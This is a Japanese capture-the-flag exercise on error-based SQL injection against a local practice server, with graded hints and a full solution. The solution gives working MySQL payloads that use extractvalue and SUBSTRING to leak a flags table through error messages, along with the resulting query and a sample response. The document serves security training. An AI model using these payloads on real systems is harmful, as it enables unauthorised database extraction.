# 03 - Error-based Injection

`http://localhost:3003` の商品詳細(`/product?id=`)からflagを抜き出せ。
`server.py`のソースコードは読んでよい。
このDBには`flags`テーブルがあり、`flag`カラムにflagが1件入っている。

## ヒント

<details><summary>ヒント1</summary>

`server.py`の`/product`エンドポイントを見ろ。`id`はクォートなしでそのまま数値コンテキストに
埋め込まれている。エラーはそのままJSONで返る。

</details>

<details><summary>ヒント2</summary>

02のようにUNION SELECTを試しても、表示は「idが素の数字の時だけ」しか行われない仕組みに
なっていて、混ぜ込んだ行は画面に出ない。だがクエリ自体は相変わらずバリデーションなしで実行
されている → **エラーメッセージの中に**データを埋め込ませられれば、表示のフィルタを迂回できる。

</details>

<details><summary>ヒント3</summary>

MySQLの`extractvalue(xml_target, xpath_expr)`は、第2引数が不正なXPATH式だと構文エラーを
起こし、そのエラーメッセージの中に評価結果をそのまま含める。つまり`xpath_expr`に
`(SELECT flag FROM flags)`を仕込めば、flagがエラーメッセージとして返ってくる。
ただし結果は約32文字で切り詰められるので、長いflagは`SUBSTRING`で範囲をずらし複数回に
分けて取得する。

</details>

<details><summary>解答</summary>

送るpayload(`id`パラメータ、前半31文字):
```
1 AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(flag,1,31) FROM flags)))
```

サーバー側で組み立てられる実際のSQLはこうなる:
```sql
SELECT name, description, price FROM products
WHERE id = 1 AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(flag,1,31) FROM flags)))
```

分解すると:
- `1 AND ...` — id=1(実在する行)にしておき、後ろのAND条件で追加のSQLを評価させる
- `extractvalue(1, concat(0x7e, X))` — 第2引数`X`をXPATH式として評価しようとしてわざと
  失敗させる関数。失敗時のエラーメッセージに`X`の中身(`~`+評価結果)がそのまま含まれる
- `(SELECT SUBSTRING(flag,1,31) FROM flags)` — この部分が`X`の中身。flagの先頭31文字を
  取り出している

結果、レスポンスは以下のようなエラーになり、`~`の後にflagの前半が表示される:
```json
{"error": "(1105, \"XPATH syntax error: '~FLAG{error_based_extract'\")"}
```

残りは開始位置をずらして同じ手順を繰り返す:
```
1 AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(flag,32,31) FROM flags)))
```

2回分の結果(`~`より後ろ)を連結すればflag全体になる。

</details>
